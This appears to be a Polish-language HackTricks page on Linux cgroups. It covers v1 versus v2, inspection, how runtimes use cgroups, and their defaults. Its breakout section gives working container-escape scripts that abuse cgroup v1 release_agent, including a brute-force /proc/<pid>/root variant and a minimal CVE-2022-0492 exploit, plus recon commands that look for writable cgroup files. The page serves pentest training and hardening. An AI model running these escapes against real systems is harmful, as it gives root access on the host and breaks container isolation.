# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linuxowe **grupy kontrolne** to mechanizm jądra używany do grupowania procesów na potrzeby rozliczania, ograniczania, ustalania priorytetów i egzekwowania zasad. Jeśli namespaces dotyczą głównie izolowania widoku zasobów, cgroups dotyczą przede wszystkim kontrolowania **ilości** zasobów, jakie może zużywać dany zestaw procesów, a w niektórych przypadkach także **klas zasobów**, z którymi mogą one w ogóle wchodzić w interakcję. Containers stale korzystają z cgroups, nawet gdy użytkownik nigdy nie zagląda do nich bezpośrednio, ponieważ niemal każdy nowoczesny runtime potrzebuje sposobu, aby przekazać jądru: „te procesy należą do tego workloadu, a te reguły zasobów mają do nich zastosowanie”.

Dlatego container engines umieszczają nowy container w osobnym poddrzewie cgroup. Gdy drzewo procesów znajduje się już w tym miejscu, runtime może ograniczać pamięć, limitować liczbę PID-ów, ustalać wagę użycia CPU, regulować operacje I/O i ograniczać dostęp do urządzeń. W środowisku produkcyjnym jest to niezbędne zarówno dla bezpieczeństwa multi-tenant, jak i dla zwykłej higieny operacyjnej. Container bez odpowiednich kontroli zasobów może wyczerpać pamięć, zalać system procesami albo zmonopolizować CPU i I/O w sposób destabilizujący hosta lub sąsiednie workloady.

Z perspektywy bezpieczeństwa cgroups mają znaczenie z dwóch odrębnych powodów. Po pierwsze, nieprawidłowe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroups, zwłaszcza w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne primitive breakout, gdy można było je zapisywać z wnętrza containera.

## v1 Vs v2

W użyciu znajdują się dwa główne modele cgroup. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często koncentrują się na dostępnej tam dziwnej i czasami nadmiernie rozbudowanej semantyce. **cgroup v2** wprowadza bardziej ujednoliconą hierarchię i ogólnie bardziej przejrzyste zachowanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale nadal istnieją środowiska mieszane lub legacy, co oznacza, że oba modele pozostają istotne podczas analizowania rzeczywistych systemów.

Różnica ma znaczenie, ponieważ niektóre z najbardziej znanych historii dotyczących container breakout, takie jak nadużycia **`release_agent`** w cgroup v1, są bardzo ściśle związane ze starszym zachowaniem cgroup. Czytelnik, który zobaczy exploit cgroup na blogu, a następnie bezrefleksyjnie zastosuje go do nowoczesnego systemu używającego wyłącznie cgroup v2, prawdopodobnie błędnie zrozumie, co faktycznie jest możliwe na celu.

## Inspection

Najszybszym sposobem sprawdzenia, gdzie znajduje się bieżąca powłoka, jest:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z bieżącym procesem. Na nowoczesnym hoście cgroup v2 często zobaczysz wpis unified. Na starszych lub hybrydowych hostach możesz zobaczyć wiele ścieżek kontrolerów v1. Gdy znasz ścieżkę, możesz sprawdzić odpowiadające jej pliki w `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.

Na hoście cgroup v2 przydatne są następujące polecenia:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Pliki te ujawniają, które kontrolery istnieją oraz które z nich są delegowane do podrzędnych cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może mieć możliwość kontrolowania jedynie podzbioru funkcji cgroups, który faktycznie deleguje nadrzędna hierarchia.

## Laboratorium

Jednym ze sposobów obserwowania cgroups w praktyce jest uruchomienie kontenera z limitem pamięci:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Możesz również wypróbować kontener z ograniczeniem PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Te przykłady są przydatne, ponieważ pomagają połączyć flagę runtime z interfejsem plików kernela. Runtime nie egzekwuje reguły za pomocą magii; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala kernelowi egzekwować je względem drzewa procesów.

## Użycie runtime

Docker, Podman, containerd i CRI-O korzystają z cgroups w ramach standardowego działania. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **które wartości domyślne wybierają**, **jak współdziałają z systemd**, **jak działa delegowanie w trybie rootless** oraz **jaka część konfiguracji jest kontrolowana na poziomie engine, a jaka na poziomie orkiestracji**.

W Kubernetes żądania zasobów i limity ostatecznie stają się konfiguracją cgroup na węźle. Droga od YAML-a Poda do egzekwowania przez kernel prowadzi przez kubelet, runtime CRI i runtime OCI, ale cgroups nadal są mechanizmem kernela, który ostatecznie stosuje regułę. W środowiskach Incus/LXC cgroups również są intensywnie wykorzystywane, szczególnie dlatego, że kontenery systemowe często udostępniają bogatsze drzewo procesów i bardziej zbliżone do VM oczekiwania operacyjne.

## Błędne konfiguracje i breakouts

Klasyczna historia bezpieczeństwa cgroups dotyczy mechanizmu **cgroup v1 `release_agent`**, który umożliwia zapis. W tym modelu, jeśli attacker może zapisywać do właściwych plików cgroup, włączyć `notify_on_release` i kontrolować ścieżkę przechowywaną w `release_agent`, kernel może ostatecznie wykonać wybraną przez attackera ścieżkę w initial namespaces na hoście, gdy cgroup stanie się pusta. Dlatego starsze opracowania poświęcają tak wiele uwagi możliwości zapisu do kontrolerów cgroup, opcjom montowania oraz warunkom dotyczącym namespaces/capabilities.

Nawet gdy `release_agent` nie jest dostępny, błędy w cgroups nadal mają znaczenie. Nadmiernie szeroki dostęp do urządzeń może sprawić, że urządzenia hosta będą osiągalne z kontenera. Brak limitów pamięci i PID może zamienić proste code execution w DoS hosta. Słabe delegowanie cgroup w scenariuszach rootless może również wprowadzić defenderów w błąd i sprawić, że założą istnienie ograniczenia, którego runtime nigdy faktycznie nie był w stanie zastosować.

### `release_agent` — informacje podstawowe

Technika `release_agent` dotyczy wyłącznie **cgroup v1**. Podstawowy pomysł polega na tym, że gdy ostatni proces w cgroup zakończy działanie i ustawione jest `notify_on_release=1`, kernel wykonuje program, którego ścieżka jest przechowywana w `release_agent`. To wykonanie odbywa się w **initial namespaces na hoście**, co zmienia zapisywalny `release_agent` w primitive umożliwiający container escape.

Aby technika zadziałała, attacker zazwyczaj potrzebuje:

- hierarchii **cgroup v1** z możliwością zapisu
- możliwości utworzenia lub użycia child cgroup
- możliwości ustawienia `notify_on_release`
- możliwości zapisania ścieżki w `release_agent`
- ścieżki, która z punktu widzenia hosta wskazuje na plik wykonywalny

### Klasyczne PoC

Historyczny PoC w postaci one-linera to:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ten PoC zapisuje ścieżkę payloadu w `release_agent`, wyzwala zwolnienie cgroup, a następnie odczytuje plik wyjściowy wygenerowany na hoście.

### Przejrzyste omówienie

Tę samą ideę łatwiej zrozumieć po rozbiciu jej na kroki.<sup>[[1]](#references)</sup>

1. Utwórz i przygotuj zapisywalny cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Zidentyfikuj ścieżkę hosta odpowiadającą systemowi plików kontenera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Upuść payload, który będzie widoczny ze ścieżki hosta:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Wyzwól wykonanie, opróżniając cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efektem jest wykonanie payloadu po stronie hosta z uprawnieniami root hosta. W prawdziwym exploicie payload zwykle zapisuje plik potwierdzający, uruchamia reverse shell lub modyfikuje stan hosta.

### Wariant ścieżki względnej wykorzystujący `/proc/<pid>/root`

W niektórych środowiskach ścieżka hosta do systemu plików kontenera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżkę payloadu można wyrazić za pomocą `/proc/<pid>/root/...`, gdzie `<pid>` jest PID-em hosta należącym do procesu w bieżącym kontenerze. Na tym opiera się wariant brute-force oparty na ścieżce względnej:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Istotnym trikiem nie jest tutaj samo brute force, lecz forma ścieżki: `/proc/<pid>/root/...` pozwala kernelowi rozwiązać plik znajdujący się wewnątrz filesystemu kontenera z przestrzeni nazw hosta, nawet gdy bezpośrednia ścieżka storage hosta nie jest wcześniej znana.

### Wariant CVE-2022-0492

W 2022 roku CVE-2022-0492 wykazało, że zapis do `release_agent` w cgroup v1 nie sprawdzał poprawnie `CAP_SYS_ADMIN` w **początkowej** przestrzeni nazw użytkowników. Dzięki temu technika była znacznie łatwiej dostępna na podatnych kernelach, ponieważ proces kontenera, który mógł zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez wcześniejszego uzyskania uprawnień w przestrzeni nazw użytkowników hosta.<sup>[[3]](#references)</sup>

Minimalny exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na podatnym jądrze host wykonuje `/proc/self/exe` z uprawnieniami root na hoście.

W praktyce wykorzystania zacznij od sprawdzenia, czy środowisko nadal udostępnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Jeśli `release_agent` jest obecny i można go zapisywać, masz już do czynienia z legacy breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Jeśli sama ścieżka cgroup nie prowadzi do ucieczki, kolejnym praktycznym zastosowaniem jest często odmowa usługi lub rozpoznanie:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Te polecenia szybko pokazują, czy workload ma możliwość uruchomienia fork-bomb, agresywnego zużywania pamięci lub nadużycia zapisywalnego, starszego interfejsu cgroup.

## Checks

Podczas przeglądania celu zadaniem checks dotyczących cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare primitives breakout, takie jak `release_agent`, są w ogóle istotne.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Co jest tutaj interesujące:

- Jeśli `mount | grep cgroup` pokazuje **cgroup v1**, starsze writeupy dotyczące breakout stają się bardziej istotne.
- Jeśli `release_agent` istnieje i jest osiągalny, natychmiast warto przeprowadzić dokładniejsze sprawdzenie.
- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma również silne capabilities, środowisko wymaga znacznie dokładniejszej analizy.

Jeśli odkryjesz **cgroup v1**, zapisywalne mounty kontrolerów oraz kontener, który ma również silne capabilities albo słabą ochronę seccomp/AppArmor, taka kombinacja wymaga szczególnej uwagi. cgroups są często traktowane jako mało interesujący temat związany z zarządzaniem zasobami, ale historycznie były częścią jednych z najbardziej pouczających łańcuchów container escape, właśnie dlatego, że granica między „kontrolą zasobów” a „wpływem na hosta” nie zawsze była tak wyraźna, jak zakładano.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że zostaną ustawione za pomocą flag | pominięcie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Włączone domyślnie | `--cgroups=enabled` jest ustawieniem domyślnym; ustawienia namespace cgroup różnią się w zależności od wersji cgroup (`private` w cgroup v2, `host` w niektórych konfiguracjach cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, poluzowany dostęp do urządzeń, `--privileged` |
| Kubernetes | Domyślnie włączone przez runtime | Pody i kontenery są umieszczane w cgroups przez runtime noda; szczegółowa kontrola zasobów zależy od `resources.requests` / `resources.limits` | pominięcie requestów/limitów zasobów, uprzywilejowany dostęp do urządzeń, błędna konfiguracja runtime na poziomie hosta |
| containerd / CRI-O | Włączone domyślnie | cgroups są częścią standardowego zarządzania cyklem życia | bezpośrednie konfiguracje runtime, które osłabiają kontrolę urządzeń lub udostępniają starsze zapisywalne interfejsy cgroup v1 |

Istotne rozróżnienie polega na tym, że **istnienie cgroup** jest zazwyczaj domyślne, natomiast **użyteczne ograniczenia zasobów** są często opcjonalne, chyba że zostaną jawnie skonfigurowane.

## Odnośniki

- [1] [Zrozumienie container escape w Dockerze](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Nowa podatność Linuksa CVE-2022-0492 dotycząca cgroups: czy kontenery mogą wykonać escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
